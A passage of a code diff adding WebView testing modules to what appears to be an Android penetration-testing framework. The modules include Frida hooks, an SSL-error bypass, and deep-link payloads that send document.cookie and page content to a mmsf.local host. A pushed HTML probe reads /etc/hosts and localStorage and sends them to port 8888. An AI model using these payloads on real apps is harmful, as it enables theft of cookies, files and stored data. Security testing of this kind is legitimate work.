+                        print(f"    {Fore.WHITE}{line}{Fore.RESET}")
+
+            # ── 6. Summary table ──────────────────────────────────────────────
+            print(Fore.CYAN + "\n── Summary " + "─"*60 + Fore.RESET)
+            total_classes = len(class_data)
+            exploitable   = sum(1 for c in chains_found if c["severity"] == "EXPLOITABLE")
+            likely        = sum(1 for c in chains_found if c["severity"] == "LIKELY_EXPLOITABLE")
+
+            print(f"  Classes with WebView code : {total_classes}")
+            print(f"  Exploit chains found      : {len(chains_found)}")
+            print(f"  {Fore.RED}EXPLOITABLE (confirmed)   : {exploitable}{Fore.RESET}")
+            print(f"  {Fore.YELLOW}LIKELY_EXPLOITABLE        : {likely}{Fore.RESET}")
+            if target_sdk and target_sdk < 17:
+                print(Fore.RED + "\n  ⚠ CRITICAL: targetSdkVersion < 17 — ALL addJavascriptInterface calls\n"
+                      "    are exploitable without @JavascriptInterface annotation!" + Fore.RESET)
+            print()
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "APK_PATH",     "value": data.get("apk_path", ""),
+                 "description": "Path to the .apk file (auto-decoded with apktool)", "required": False},
+                {"name": "DECODED_PATH", "value": data.get("decoded_path", ""),
+                 "description": "Path to existing apktool decoded directory",        "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def webview_frida(self, cmd, data):
+        if cmd == "run":
+            if data["mode"] == '-R' and not data["host"]:
+                print(Fore.RED + "[-] Set HOST for Remote mode!" + Fore.RESET)
+                return 0
+            if not data["app"]:
+                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
+                return 0
+
+            frida_script = r"""
+    Java.perform(function() {
+        var WV  = Java.use('android.webkit.WebView');
+        var WVC = Java.use('android.webkit.WebViewClient');
+
+        WV.loadUrl.overload('java.lang.String').implementation = function(url) {
+            send('[loadUrl] ' + url);
+            return this.loadUrl(url);
+        };
+        WV.loadUrl.overload('java.lang.String','java.util.Map').implementation = function(url, h) {
+            send('[loadUrl+headers] ' + url);
+            return this.loadUrl(url, h);
+        };
+        try {
+            WV.evaluateJavascript.implementation = function(js, cb) {
+                send('[evaluateJavascript] ' + js.substring(0, 300));
+                return this.evaluateJavascript(js, cb);
+            };
+        } catch(e) {}
+        WV.addJavascriptInterface.implementation = function(obj, name) {
+            send('[addJavascriptInterface] name=' + name + '  class=' + obj.$className);
+            return this.addJavascriptInterface(obj, name);
+        };
+        WVC.onReceivedSslError.implementation = function(view, handler, err) {
+            send('[onReceivedSslError] proceeding despite: ' + err.toString());
+            handler.proceed();
+        };
+        send('[MMSF] WebView hooks active.');
+    });
+    """
+            import frida as _frida, signal as _signal
+
+            def on_message(message, _data):
+                if message.get("type") == "send":
+                    payload = message.get("payload", "")
+                    colour = (Fore.RED   if any(x in payload for x in ["addJavascript","onReceivedSsl"])
+                        else Fore.CYAN  if "[loadUrl]" in payload
+                        else Fore.GREEN if "[MMSF]"    in payload
+                        else Fore.YELLOW)
+                    print(colour + "[WebView] " + payload + Fore.RESET)
+                elif message.get("type") == "error":
+                    print(Fore.RED + "[-] " + str(message.get("stack","")) + Fore.RESET)
+
+            try:
+                device  = (_frida.get_device_manager().add_remote_device(data["host"])
+                        if data["mode"] == "-R" else _frida.get_usb_device())
+                print(Fore.YELLOW + f"[*] Attached to {data['app']} — press Ctrl+C to stop." + Fore.RESET)
+
+                if data["method"] == "-f":
+                    pid     = device.spawn([data["app"]])
+                    session = device.attach(pid)
+                else:
+                    session = device.attach(data["app"])
+
+                script = session.create_script(frida_script)
+                script.on("message", on_message)
+                script.load()
+
+                if data["method"] == "-f" and not data.get("pause"):
+                    device.resume(pid)
+
+                _signal.pause()   # block until Ctrl+C
+
+            except KeyboardInterrupt:
+                print(Fore.YELLOW + "\n[*] Stopped." + Fore.RESET)
+            except Exception as e:
+                print(Fore.RED + f"[-] {e}" + Fore.RESET)
+                return 0
+            finally:
+                try: script.unload(); session.detach()
+                except: pass
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name":"MODE",   "value": data["mode"],   "description":"Serial(-U) or Remote(-R)","required":False},
+                {"name":"APP",    "value": data["app"],    "description":"Package name"},
+                {"name":"HOST",   "value": data["host"],   "description":"Remote host","required":False},
+                {"name":"METHOD", "value": data["method"], "description":"Spawn(-f) or Attach(-F)","required":False},
+                {"name":"PAUSE",  "value": data.get("pause",""), "description":"Keep paused after spawn","required":False}])
+            return 0
+        elif cmd == "exit":  quit_app()
+        elif cmd == "back":  back(); return 2
+
+    def webview_deeplink(self, cmd, data):
+        """
+        Send deep link payloads via ADB am start to probe WebView
+        URL handlers for javascript: and file:// injection.
+        """
+        if cmd == "run":
+            pkg    = data.get("package", "")
+            scheme = data.get("url_scheme", "")
+            if not pkg or not scheme:
+                print(Fore.RED + "[-] Set PACKAGE and URL_SCHEME first!" + Fore.RESET)
+                return 0
+
+            key     = data.get("extra_key", "url")
+            payload_type = data.get("payloads", "default")
+            adb     = Constants.ADB.value
+
+            payloads = {
+                "default": [
+                    "javascript:alert(document.domain)",
+                    "javascript:document.location='http://mmsf.local/?c='+document.cookie",
+                    "file:///etc/hosts",
+                    "file:///data/data/" + pkg + "/shared_prefs/",
+                    "content://com.android.contacts/contacts",
+                ],
+                "file":    ["file:///etc/hosts", "file:///proc/version", "file:///data/data/" + pkg + "/databases/"],
+                "js":      ["javascript:alert(1)", "javascript:void(fetch('http://mmsf.local/?x='+btoa(document.body.innerHTML)))"]
+            }
+            selected = payloads.get(payload_type, payloads["default"])
+
+            print(Fore.CYAN + f"\n[*] Probing {pkg} with {len(selected)} payload(s)..." + Fore.RESET)
+            for p in selected:
+                full_uri = f"{scheme}://{p}" if not p.startswith(("javascript:", "file:", "content:")) else p
+                cmd_parts = [adb, "shell", "am", "start",
+                             "-a", "android.intent.action.VIEW",
+                             "-d", full_uri,
+                             "--es", key, p,
+                             pkg]
+                print(Fore.YELLOW + f"  → {p}" + Fore.RESET)
+                subprocess.run(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                import time; time.sleep(1)
+
+            print(Fore.GREEN + "[+] Payload sequence sent. Check device / Frida output." + Fore.RESET)
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "PACKAGE",    "value": data.get("package", ""),    "description": "Target package name"},
+                {"name": "URL_SCHEME", "value": data.get("url_scheme", ""), "description": "App URL scheme (e.g. myapp)"},
+                {"name": "EXTRA_KEY",  "value": data.get("extra_key", ""),  "description": "Intent extra key for the URL. Default: url", "required": False},
+                {"name": "PAYLOADS",   "value": data.get("payloads", ""),   "description": "Payload set: default | file | js", "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def webview_fileaccess(self, cmd, data):
+        """
+        Push a probe HTML file to device and open it in the target app's WebView
+        to test file://, content://, android_asset:// protocol handlers.
+        """
+        if cmd == "run":
+            pkg  = data.get("package", "")
+            if not pkg:
+                print(Fore.RED + "[-] Set PACKAGE first!" + Fore.RESET)
+                return 0
+
+            probe  = data.get("probe", "file")
+            fpath  = data.get("file_path", "/sdcard/mmsf_probe.html")
+            adb    = Constants.ADB.value
+
+            probe_html = """<!DOCTYPE html><html><head><meta charset='utf-8'></head><body>
+<script>
+function exfil(data) {
+    var img = new Image();
+    img.src = 'http://mmsf.local:8888/?data=' + encodeURIComponent(data);
+}
+// file:// same-origin read
+try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file:///etc/hosts', false);
+    xhr.send();
+    exfil('hosts:' + xhr.responseText);
+} catch(e) { exfil('file_err:' + e); }
+// localStorage
+try { exfil('ls:' + JSON.stringify(localStorage)); } catch(e) {}
+document.body.innerHTML = '<h2>MMSF WebView Probe Active</h2><p>Check mmsf.local:8888 for data.</p>';
+</script></body></html>
+"""
+            # Write probe locally, push to device
+            local_probe = os.path.expanduser("~/.mmsf/loot/webview_probe.html")
+            os.makedirs(os.path.dirname(local_probe), exist_ok=True)
+            with open(local_probe, "w") as f:
+                f.write(probe_html)
+
+            print(Fore.YELLOW + f"[*] Pushing probe to {fpath} ..." + Fore.RESET)
+            subprocess.run([adb, "push", local_probe, fpath])
+
+            uri_map = {
+                "file":    f"file://{fpath}",
+                "content": f"content://com.android.externalstorage.documents/document/primary%3Ammsf_probe.html",
+                "asset":   f"file:///android_asset/mmsf_probe.html"
+            }
+            uri = uri_map.get(probe, f"file://{fpath}")
+
+            print(Fore.YELLOW + f"[*] Opening URI in {pkg}: {uri}" + Fore.RESET)
+            subprocess.run([adb, "shell", "am", "start",
+                           "-a", "android.intent.action.VIEW",
+                           "-d", uri, pkg])
+
+            print(Fore.GREEN + "[+] Probe launched. Listen on port 8888 for exfil callbacks:" + Fore.RESET)
+            print(Fore.WHITE  + "    python3 -m http.server 8888  # or nc -lvp 8888" + Fore.RESET)
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "PACKAGE",   "value": data.get("package", ""),   "description": "Target app package"},
+                {"name": "FILE_PATH", "value": data.get("file_path", ""), "description": "On-device path for probe HTML. Default: /sdcard/mmsf_probe.html", "required": False},
+                {"name": "PROBE",     "value": data.get("probe", ""),     "description": "Protocol to test: file | content | asset. Default: file", "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def webview_cleanup(self, cmd, data):
+        if cmd == "run":
+            if data["mode"] == '-R' and not data["host"]:
+                print(Fore.RED + "[-] Set HOST for Remote mode!" + Fore.RESET)
+                return 0
+            if not data["app"]:
+                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
+                return 0
+
+            frida_script = r"""
+    Java.perform(function() {
+        var WV = Java.use('android.webkit.WebView');
+        var CM = Java.use('android.webkit.CookieManager');
+        var WS = Java.use('android.webkit.WebStorage');
+        var called = { cache:false, cookies:false, history:false, storage:false };
+
+        WV.clearCache.implementation = function(inc) {
+            called.cache = true;
+            send('[CLEANUP] clearCache(' + inc + ')');
+            return this.clearCache(inc);
+        };
+        WV.clearHistory.implementation = function() {
+            called.history = true;
+            send('[CLEANUP] clearHistory()');
+            return this.clearHistory();
+        };
+        try {
+            CM.removeAllCookies.implementation = function(cb) {
+                called.cookies = true;
+                send('[CLEANUP] CookieManager.removeAllCookies()');
+                return this.removeAllCookies(cb);
+            };
+        } catch(e) {
+            CM.removeAllCookies.overload().implementation = function() {
+                called.cookies = true;
+                send('[CLEANUP] CookieManager.removeAllCookies()');
+                return this.removeAllCookies();
+            };
+        }
+        WS.deleteAllData.implementation = function() {
+            called.storage = true;
+            send('[CLEANUP] WebStorage.deleteAllData()');
+            return this.deleteAllData();
+        };
+
+        setTimeout(function() {
+            var missing = [];
+            if (!called.cache)   missing.push('clearCache');
+            if (!called.cookies) missing.push('removeAllCookies');
+            if (!called.history) missing.push('clearHistory');
+            if (!called.storage) missing.push('deleteAllData');
+            send(missing.length ? '[MISSING] Not called: ' + missing.join(', ')
+                                : '[OK] All cleanup methods called.');
+            send('__DONE__');
+        }, 15000);
+
+        send('[MMSF] Cleanup hooks active — trigger logout within 15s.');
+    });
+    """
+            import frida as _frida, threading as _threading
+
+            done = _threading.Event()
+
+            def on_message(message, _data):
+                if message.get("type") == "send":
+                    payload = message.get("payload", "")
+                    if payload == "__DONE__": done.set(); return
+                    colour = (Fore.RED    if "[MISSING]" in payload
+                        else Fore.GREEN  if "[OK]"      in payload
+                        else Fore.CYAN   if "[CLEANUP]" in payload
+                        else Fore.GREEN)
+                    print(colour + "[Cleanup] " + payload + Fore.RESET)
+                elif message.get("type") == "error":
+                    print(Fore.RED + "[-] " + str(message.get("stack","")) + Fore.RESET)
+                    done.set()
+
+            try:
+                device  = (_frida.get_device_manager().add_remote_device(data["host"])
+                        if data["mode"] == "-R" else _frida.get_usb_device())
+                print(Fore.YELLOW + f"[*] Attached to {data['app']} — trigger logout now (15s)." + Fore.RESET)
+
+                if data.get("method", "-F") == "-f":
+                    pid     = device.spawn([data["app"]])
+                    session = device.attach(pid)
+                    script  = session.create_script(frida_script)
+                    script.on("message", on_message)
+                    script.load()
+                    if not data.get("pause"): device.resume(pid)
+                else:
+                    session = device.attach(data["app"])
+                    script  = session.create_script(frida_script)
+                    script.on("message", on_message)
+                    script.load()
+
+                done.wait(timeout=20)
+
+            except KeyboardInterrupt:
+                print(Fore.YELLOW + "\n[*] Stopped." + Fore.RESET)
+            except Exception as e:
+                print(Fore.RED + f"[-] {e}" + Fore.RESET)
+                return 0
+            finally:
+                try: script.unload(); session.detach()
+                except: pass
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name":"MODE",   "value": data["mode"],            "description":"Serial or Remote","required":False},
+                {"name":"APP",    "value": data["app"],             "description":"Package name"},
+                {"name":"HOST",   "value": data["host"],            "description":"Remote host","required":False},
+                {"name":"METHOD", "value": data.get("method","-F"), "description":"Spawn(-f) or Attach(-F)","required":False}])
+            return 0
+        elif cmd == "exit":  quit_app()
+        elif cmd == "back":  back(); return 2
+
+    def hook_task_hijacking(self, cmd, data):
+        """
+        Background Frida hook for Task Hijacking (StrandHogg 1.0) analysis.
+        The frida session runs in a daemon thread — MMSF stays fully interactive.
+        New activity events print live as they fire.
+        """
+        self._frida.config = data
+
+        if cmd == "run":
+            if self._frida.config["mode"] == '-R':
+                if not self._frida.config["host"]:
+                    print(Fore.RED + "[-] Set HOST first (MODE is REMOTE)!" + Fore.RESET)
+                    return 0
+            if self._frida.config["app"]:
+                threading.Thread(
+                    target=self._frida.hook_task_hijacking,
+                    args=([])).start()
+                return 1
+            else:
+                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
+                return 0
+
+        elif cmd == "stop":
+            self._frida.stop_task_hijacking()
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "MODE",   "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE",
+                 "description": "Serial or Remote. Default: SERIAL", "required": False},
+                {"name": "APP",    "value": self._frida.config["app"],
+                 "description": "Target package: com.mmsf.taskhijackingvictim"},
+                {"name": "HOST",   "value": self._frida.config["host"],
+                 "description": "Host if MODE=REMOTE. Default: 127.0.0.1", "required": False},
+                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST",
+                 "description": "Attach method. Default: SPAWN", "required": False},
+            ])
+            return 0
+
         elif cmd == "exit":
             quit_app()
         elif cmd == "back":
